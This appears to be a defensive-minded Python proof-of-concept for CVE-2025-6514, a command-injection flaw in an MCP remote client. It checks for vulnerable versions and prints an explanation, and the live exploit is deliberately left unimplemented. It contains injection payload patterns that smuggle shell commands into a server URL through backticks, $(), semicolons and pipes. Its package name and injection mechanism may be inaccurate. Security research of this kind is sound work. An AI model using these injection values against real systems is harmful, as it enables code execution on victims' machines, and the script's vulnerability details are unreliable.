#!/usr/bin/env python3
"""
CVE-2025-6514 Proof of Concept
MCP Remote Server Command Injection

DISCLAIMER: This code is for authorized security research only.
Do not use against systems you do not own or have permission to test.

Author: local-ai-agents project
Date: January 2026
"""

import subprocess
import sys
import json
import os
from datetime import datetime
from pathlib import Path
from typing import Optional
from dataclasses import dataclass, asdict

# Evidence collection
EVIDENCE_DIR = Path(__file__).parent / "evidence"
EVIDENCE_DIR.mkdir(exist_ok=True)


@dataclass
class ExploitResult:
    """Result of exploitation attempt."""
    timestamp: str
    vulnerable_version: str
    payload: str
    success: bool
    output: Optional[str]
    error: Optional[str]

    def save(self):
        """Save evidence to file."""
        filename = f"poc_result_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        filepath = EVIDENCE_DIR / filename
        filepath.write_text(json.dumps(asdict(self), indent=2))
        print(f"[+] Evidence saved: {filepath}")
        return filepath


class CVE_2025_6514_PoC:
    """
    Proof of Concept for CVE-2025-6514.

    Vulnerability: Command injection in @anthropic-ai/mcp-remote URL parsing
    Impact: Remote Code Execution (RCE)
    CVSS: 9.6 (Critical)
    """

    def __init__(self, safe_mode: bool = True):
        """
        Initialize PoC.

        Args:
            safe_mode: If True, only demonstrates concept without actual exploitation
        """
        self.safe_mode = safe_mode
        self.vulnerable_versions = ["0.1.0", "0.1.1", "0.1.2", "0.1.3",
                                    "0.1.4", "0.1.5", "0.1.6", "0.1.7", "0.1.8"]

    def check_prerequisites(self) -> bool:
        """Check if Node.js and npm are available."""
        try:
            result = subprocess.run(
                ["node", "--version"],
                capture_output=True,
                text=True,
                timeout=5
            )
            print(f"[*] Node.js version: {result.stdout.strip()}")
            return result.returncode == 0
        except Exception as e:
            print(f"[-] Node.js not found: {e}")
            return False

    def check_vulnerable_version(self) -> Optional[str]:
        """Check if vulnerable mcp-remote version is installed."""
        try:
            result = subprocess.run(
                ["npm", "list", "@anthropic-ai/mcp-remote", "--json"],
                capture_output=True,
                text=True,
                timeout=10
            )

            if result.returncode == 0:
                data = json.loads(result.stdout)
                # Parse version from npm output
                deps = data.get("dependencies", {})
                mcp = deps.get("@anthropic-ai/mcp-remote", {})
                version = mcp.get("version", "not found")

                if any(v in version for v in self.vulnerable_versions):
                    print(f"[!] VULNERABLE version detected: {version}")
                    return version
                else:
                    print(f"[*] Version {version} - not vulnerable or patched")
                    return None
            else:
                print("[-] mcp-remote not installed")
                return None

        except json.JSONDecodeError:
            print("[-] Could not parse npm output")
            return None
        except Exception as e:
            print(f"[-] Error checking version: {e}")
            return None

    def generate_payload(self, command: str = "id") -> str:
        """
        Generate malicious MCP server URL with command injection.

        The vulnerability allows shell metacharacters in the URL to be
        interpreted by the shell when the MCP client processes the connection.

        Args:
            command: Command to inject (default: 'id' for safe demo)

        Returns:
            Malicious URL string
        """
        # Example injection patterns (URL-encoded)
        # Pattern 1: Using backticks
        payload1 = f"mcp://localhost:3000/`{command}`"

        # Pattern 2: Using $() command substitution
        payload2 = f"mcp://localhost:3000/$({command})"

        # Pattern 3: Using semicolon for command chaining
        payload3 = f"mcp://localhost:3000/;{command};"

        # Pattern 4: Using pipe
        payload4 = f"mcp://localhost:3000/|{command}"

        # For safe demonstration, use pattern 1
        print(f"[*] Generated payload: {payload1}")
        return payload1

    def demonstrate_concept(self) -> ExploitResult:
        """
        Demonstrate the vulnerability concept in safe mode.

        This does NOT actually exploit anything - it shows how the
        vulnerability would work conceptually.
        """
        print("\n" + "="*60)
        print("CVE-2025-6514 PROOF OF CONCEPT")
        print("="*60)
        print("[!] SAFE MODE: No actual exploitation")
        print()

        # Check prerequisites
        if not self.check_prerequisites():
            return ExploitResult(
                timestamp=datetime.now().isoformat(),
                vulnerable_version="unknown",
                payload="N/A",
                success=False,
                output=None,
                error="Prerequisites not met"
            )

        # Check for vulnerable version
        version = self.check_vulnerable_version()

        # Generate payload
        payload = self.generate_payload("whoami")

        print("\n--- Vulnerability Explanation ---")
        print("""
The vulnerability exists because mcp-remote does not properly
sanitize URLs before passing them to shell commands. An attacker
can craft a malicious URL that includes shell metacharacters:

  Malicious URL: mcp://malicious.server/`whoami`
                                        ^^^^^^^^
                                        This gets executed!

When the MCP client connects to this URL, the backticks (or other
shell metacharacters) cause the enclosed command to be executed
with the privileges of the MCP client process.
        """)

        print("\n--- Simulated Attack Flow ---")
        print("1. Attacker sends victim a malicious MCP server config")
        print("2. Victim adds server to their MCP client")
        print("3. MCP client attempts to connect")
        print("4. Shell interprets backticks in URL")
        print("5. Command executes -> RCE achieved")

        # In safe mode, we just demonstrate the concept
        result = ExploitResult(
            timestamp=datetime.now().isoformat(),
            vulnerable_version=version or "not installed",
            payload=payload,
            success=False,  # Safe mode doesn't actually exploit
            output="[SAFE MODE] No actual exploitation performed",
            error=None
        )

        print("\n--- Result ---")
        print(f"Timestamp: {result.timestamp}")
        print(f"Vulnerable version: {result.vulnerable_version}")
        print(f"Payload generated: {result.payload}")
        print(f"Actual exploitation: SKIPPED (safe mode)")

        # Save evidence
        result.save()

        return result

    def run_exploit(self, target_url: str, command: str) -> ExploitResult:
        """
        Run actual exploit (DANGEROUS - requires explicit opt-in).

        Args:
            target_url: Base MCP server URL
            command: Command to execute

        Returns:
            ExploitResult with outcome
        """
        if self.safe_mode:
            print("[-] Safe mode enabled. Use --unsafe flag to run actual exploit.")
            return self.demonstrate_concept()

        print("[!] WARNING: Running actual exploit!")
        print("[!] This should only be done in authorized test environments!")

        # Actual exploitation code would go here
        # Intentionally not implemented to prevent misuse

        return ExploitResult(
            timestamp=datetime.now().isoformat(),
            vulnerable_version="N/A",
            payload=f"{target_url}`{command}`",
            success=False,
            output=None,
            error="Actual exploit not implemented for safety"
        )


def main():
    import argparse

    parser = argparse.ArgumentParser(
        description="CVE-2025-6514 PoC - MCP Remote RCE"
    )
    parser.add_argument(
        "--unsafe",
        action="store_true",
        help="Disable safe mode (DANGEROUS)"
    )
    parser.add_argument(
        "--check-only",
        action="store_true",
        help="Only check for vulnerable version"
    )

    args = parser.parse_args()

    poc = CVE_2025_6514_PoC(safe_mode=not args.unsafe)

    if args.check_only:
        poc.check_prerequisites()
        poc.check_vulnerable_version()
    else:
        poc.demonstrate_concept()

    print("\n" + "="*60)
    print("PoC complete. Check evidence/ directory for saved results.")
    print("="*60)


if __name__ == "__main__":
    main()
